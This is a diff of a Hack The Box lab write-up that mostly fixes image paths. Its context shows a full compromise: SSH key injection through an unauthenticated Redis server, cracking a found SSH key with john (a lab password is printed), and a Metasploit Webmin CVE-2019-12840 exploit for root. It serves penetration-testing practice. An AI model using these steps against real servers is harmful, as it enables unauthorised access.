@@ -48,19 +48,19 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Port 80 shows a personal website that's still under construction.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_16-55.png)
+![](Assets/2026-08-22_16-55.png)
 
 There's no hardcoded credentials sitting in the page source, and directory brute forcing against it doesn't turn up anything interesting either.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_17-15.png)
+![](Assets/2026-08-22_17-01.png)
 
 Visiting port 10000 shows a Webmin login page. Webmin is a web-based control panel for Unix-like systems, and it lets system administrators manage user accounts, disk quotas, services, and configuration files through a graphical interface instead of the command line.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_17-01.png)
+![](Assets/2026-08-22_17-03.png)
 
 Entering some random credentials just shows a login failed message, and directory brute forcing against this one comes up empty too.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_17-03.png)
+![](Assets/2026-08-22_17-15.png)
 
 ## Foothold
 
@@ -71,11 +71,11 @@ sudo apt install redis-tools
 redis-cli -h 10.129.2.1
 ```
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_17-56.png)
+![](Assets/2026-08-22_17-56.png)
 
 I get in with no authentication at all, so I'll enumerate it to see what's stored. There are no keys sitting in the database, but I can see a user named `redis` exists on the system.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_18-01.png)
+![](Assets/2026-08-22_18-01.png)
 
 This is the default account that runs the Redis service, and unlike a normal user it has its own separate home directory at `/var/lib/redis` rather than under `/home`. 
 
@@ -86,11 +86,11 @@ CONFIG SET dir /var/lib/redis/.ssh
 CONFIG GET DIR
 ```
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_18-07.png)
+![](Assets/2026-08-22_18-07.png)
 
 No error comes back, which means that directory exists. Next, I'll drop my own public SSH key into its `authorized_keys` file. First, I'll generate a keypair with `ssh-keygen`.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_18-36.png)
+![](Assets/2026-08-22_18-36.png)
 
 Since Redis dumps its entire memory contents to disk when saving, the raw key file could easily get corrupted by other stray bytes around it, so I'll pad it with extra newlines before injecting it:
 
@@ -104,7 +104,7 @@ Then I'll inject it into Redis as a value:
 cat space_id-rsa.txt | redis-cli -h 10.129.2.1 -x set ssh_key
 ```
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_18-39.png)
+![](Assets/2026-08-22_18-39.png)
 
 Now I'll log back into Redis and tell it to save its database directly into the `.ssh` directory, using `authorized_keys` as the filename:
 
@@ -116,7 +116,7 @@ SAVE
 EXIT
 ```
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_18-44.png)
+![](Assets/2026-08-22_18-44.png)
 
 With that written, I can now log in using my private key:
 
@@ -124,11 +124,11 @@ With that written, I can now log in using my private key:
 ssh -i id_rsa redis@10.129.2.1
 ```
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_18-46.png)
+![](Assets/2026-08-22_18-46.png)
 
 There's no user flag sitting in `redis`'s home directory, which means we need to escalate to a different user. Looking through the home directories, there's a user named `Matt`.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_19-44.png)
+![](Assets/2026-08-22_19-44.png)
 
 Hunting for credentials on the box, I find a backup file under `/opt`:
 
@@ -136,11 +136,11 @@ Hunting for credentials on the box, I find a backup file under `/opt`:
 find / -name "*.bak" -type f 2>/dev/null
 ```
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_19-47.png)
+![](Assets/2026-08-22_19-47.png)
 
 This turns out to be an SSH private key.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_19-48.png)
+![](Assets/2026-08-22_19-48.png)
 
 I'll copy it over to my attack host and run it through `ssh2john` to make it crackable:
 
@@ -149,33 +149,33 @@ ssh2john private_key > private_key.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt private_key.txt
 ```
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_19-51.png)
+![](Assets/2026-08-22_19-51.png)
 
 `john` cracks it to `computer2008`. I'll try logging in as `Matt` with this password directly.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_19-53.png)
+![](Assets/2026-08-22_19-53.png)
 
 This comes back with permission denied, so SSH probably isn't enabled for this account directly. I still have my SSH session as `redis`, though, so I'll try switching to `Matt` from inside that instead. 
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_19-55.png)
+![](Assets/2026-08-22_19-55.png)
 
 This works, and from here I can read the user flag.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_19-57.png)
+![](Assets/2026-08-22_19-57.png)
 
 ## Privilege Escalation
 
 There's nothing else obviously interesting under `Matt`'s account, so I head back to the Webmin login page and try `Matt`'s recovered password there, and it gets me in.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_19-59.png)
+![](Assets/2026-08-22_19-59.png)
 
 I find that this specific Webmin version, 1.910, is vulnerable to `CVE-2019-12840`. This lets any user with access to the "Package Updates" module execute commands as `root`.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_20-11.png)
+![](Assets/2026-08-22_20-11.png)
 
 Checking permissions confirms `Matt` is indeed authorized for that module.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_20-13.png)
+![](Assets/2026-08-22_20-13.png)
 
 I'll exploit this with Metasploit:
 
@@ -191,10 +191,10 @@ set SSL true
 run
 ```
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_20-19.png)
+![](Assets/2026-08-22_20-19.png)
 
 This gets us a shell as `root`, and from there I can read the root flag.
 
-![](Writeups/Hack%20The%20Box/Assets/2026-08-22_20-21.png)
+![](Assets/2026-08-22_20-21.png)
 
 ---
